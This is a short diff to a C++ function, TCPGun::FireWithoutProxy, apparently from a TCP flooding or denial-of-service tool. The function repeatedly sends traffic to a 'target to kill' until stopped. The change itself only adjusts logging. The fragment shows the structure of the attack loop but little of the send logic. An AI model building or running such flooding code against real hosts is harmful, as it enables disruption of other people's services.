@@ -14,10 +14,10 @@ bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 	const std::string currentTarget
 		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
 	TCPWrapper tcpAttacker;
+
 	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), {})};
 	while(!g_shouldStop.load() && resolvedAddress)
 	{
-		std::cout << resolvedAddress->address << " is up" << std::endl;
 		for(size_t count = 0; 
 			count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK; count++)
 		{
@@ -26,6 +26,7 @@ bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 			if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
 				sendStatus == TCPWrapper::TCPStatus::GotError)
 			{
+				std::cerr << "Got an error" << std::endl;
 				return true;
 			}
 		}
